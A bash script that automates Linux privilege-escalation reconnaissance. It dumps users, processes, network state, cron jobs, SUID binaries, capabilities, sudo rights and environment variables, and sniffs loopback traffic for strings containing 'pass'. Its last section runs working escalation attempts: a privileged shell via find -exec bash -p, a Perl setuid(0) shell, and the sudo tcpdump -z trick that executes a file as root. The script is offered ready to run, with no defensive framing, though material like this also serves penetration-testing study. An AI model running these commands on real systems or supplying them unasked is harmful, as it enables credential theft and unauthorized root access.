#!/bin/bash
# ==============================================================================
# Linux Privilege Escalation Automated Enumeration Script
# Built from Linux Privilege Escalation Source Material
# ==============================================================================

# Cấu hình màu sắc hiển thị
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
NC='\033[0m' # No Color

print_header() {
    echo -e "\n${CYAN}======================================================================${NC}"
    echo -e "${YELLOW}[+] $1${NC}"
    echo -e "${CYAN}======================================================================${NC}"
}

run_cmd() {
    local title="$1"
    local cmd="$2"
    echo -e "\n${GREEN}---> ${title}${NC} (${BLUE}${cmd}${NC})"
    echo "----------------------------------------------------------------------"
    eval "$cmd" 2>&1
    echo "----------------------------------------------------------------------"
}

# 1. User & Identity Enumeration
print_header "1. USER & IDENTITY ENUMERATION"
run_cmd "Current User Identity" "whoami"
run_cmd "User Details & Groups (UID, GID)" "id"
run_cmd "System Users List (/etc/passwd)" "cat /etc/passwd"
run_cmd "Shadow File Permissions (/etc/shadow)" "ls -l /etc/shadow"

# 2. System, OS & Kernel Info
print_header "2. SYSTEM, OS & KERNEL INFORMATION"
run_cmd "Hostname" "hostname"
run_cmd "OS Release Info (/etc/issue)" "cat /etc/issue"
run_cmd "OS Release Details (/etc/os-release)" "cat /etc/os-release"
run_cmd "Kernel Details (uname -a)" "uname -a"
run_cmd "Kernel Version (uname -r)" "uname -r"
run_cmd "System Architecture" "arch"

# 3. Processes & Services Enumeration
print_header "3. PROCESSES & SERVICES ENUMERATION"
run_cmd "Running Processes (ps aux)" "ps aux"
run_cmd "Running Processes (ps axu)" "ps axu"
run_cmd "Check Process 'passwd'" "ps u -C passwd"
run_cmd "Process Uid Status in /proc" "grep Uid /proc/[0-9]*/status 2>/dev/null | head -n 30"

# 4. Network, Ports & Firewall
print_header "4. NETWORK, PORTS & FIREWALL ENUMERATION"
run_cmd "Network Interfaces (ip a)" "ip a"
run_cmd "Routing Table (routel)" "routel"
run_cmd "Active Connections & Listening Ports (ss -anp)" "ss -anp"
run_cmd "Iptables Rules (/etc/iptables/rules.v4)" "cat /etc/iptables/rules.v4"
run_cmd "Capture Traffic on Loopback (tcpdump - non-blocking test)" "timeout 2 sudo -n tcpdump -i lo -A 2>&1 | grep 'pass'"

# 5. Cron Jobs & System Logs
print_header "5. CRON JOBS & SYSTEM LOGS"
run_cmd "Cron Directories (/etc/cron*)" "ls -lah /etc/cron*"
run_cmd "Current User Crontab" "crontab -l"
run_cmd "Root Crontab (requires sudo)" "sudo -n crontab -l 2>/dev/null || echo '[!] Sudo password required for crontab -l'"
run_cmd "Cron Logs in /var/log/syslog" "grep 'CRON' /var/log/syslog 2>/dev/null"
run_cmd "Syslog Filtered for tcpdump" "cat /var/log/syslog 2>/dev/null | grep tcpdump"

# 6. Installed Packages
print_header "6. INSTALLED PACKAGES"
run_cmd "Debian/Ubuntu Installed Packages (dpkg -l)" "dpkg -l"

# 7. Permissions, SUID/SGID & Capabilities
print_header "7. PERMISSIONS, SUID/SGID & CAPABILITIES"
run_cmd "World Writable Directories" "find / -writable -type d 2>/dev/null"
run_cmd "SUID Binaries" "find / -perm -u=s -type f 2>/dev/null"
run_cmd "Linux Capabilities" "/usr/sbin/getcap -r / 2>/dev/null"
run_cmd "Permissions of /usr/bin/passwd" "ls -asl /usr/bin/passwd"

# 8. File Systems, Mounts & Kernel Modules
print_header "8. FILE SYSTEMS, MOUNTS & KERNEL MODULES"
run_cmd "fstab Configuration (/etc/fstab)" "cat /etc/fstab"
run_cmd "Mounted File Systems (mount)" "mount"
run_cmd "Block Devices (lsblk)" "lsblk"
run_cmd "Loaded Kernel Modules (lsmod)" "lsmod"
run_cmd "Module Info Example (/sbin/modinfo libata)" "/sbin/modinfo libata 2>/dev/null"

# 9. Environment & Dotfiles
print_header "9. ENVIRONMENT VARIABLES & DOTFILES"
run_cmd "Environment Variables (env)" "env"
run_cmd "User Shell Config (~/.bashrc)" "cat ~/.bashrc 2>/dev/null || cat .bashrc 2>/dev/null"

# 10. Sudo Rights & AppArmor Security
print_header "10. SUDO RIGHTS & APPARMOR SECURITY"
run_cmd "Sudo Permissions (sudo -n -l)" "sudo -n -l 2>&1"
run_cmd "AppArmor Status (aa-status)" "aa-status 2>&1"

# 11. Automated Tool Check
print_header "11. AUTOMATED TOOL CHECK"
run_cmd "unix-privesc-check execution" "if [ -f './unix-privesc-check' ]; then ./unix-privesc-check standard > output.txt && echo '[+] Output saved to output.txt'; else echo '[!] unix-privesc-check not found in current directory'; fi"

# 12. Exploit & Vector Verification Checks
print_header "12. EXPLOIT & VECTOR VERIFICATION CHECKS"
run_cmd "Test SUID find Binary Escape" "find /home -exec '/usr/bin/bash' -p \; 2>&1 | head -n 5"
run_cmd "Test Perl Capability Privilege Escalation" "perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec \"/bin/sh\";' 2>&1"
run_cmd "Test Sudo tcpdump Privilege Escalation (-z flag)" "TF=\$(mktemp); echo 'id' > \$TF; chmod +x \$TF; sudo -n tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z \$TF -Z root 2>&1"

echo -e "\n${GREEN}[+] Enumeration completed!${NC}\n"
